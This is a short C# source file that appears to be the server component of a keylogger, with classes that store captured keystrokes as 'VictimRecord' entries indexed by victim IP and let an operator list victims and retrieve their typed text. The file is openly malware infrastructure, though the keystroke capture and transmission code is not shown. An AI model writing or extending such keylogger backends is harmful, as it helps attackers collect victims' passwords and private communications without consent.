using SpyCommunicationLib.Entities;

namespace Server.Data
{
    class RecordsGenerator
    {
        private static int GlobalId = 0;

        public static VictimRecord GenerateVictimRecord(string keys, string ip)
        {
            return new VictimRecord {
                   Id = GlobalId++,
                   VictimIp = ip,
                   Date = DateTime.Now,
                   Text = keys
            };
        }
    }

    class RecordsContainer
    {
        private static object _locker = new();
        private static HashSet<string> _victims_ip = new HashSet<string>();
        private static List<VictimRecord> _records = new List<VictimRecord>();

        public static void AddRecord(string keys, string ip)
        {
            if (!_victims_ip.Contains(ip))
            {
                lock (_locker)
                    _victims_ip.Add(ip); 
            }

            lock (_locker) {
                _records.Add(RecordsGenerator.GenerateVictimRecord(keys, ip));
            }
        }

        public static List<string> GetVictimsIps()
        {
            return _victims_ip.ToList();
        }

        public static List<VictimRecord> GetRecordsByIp(string ip)
        {
            return _records
                .AsParallel()
                .Where(r => r.VictimIp == ip)
                .ToList();
        }
    }


}
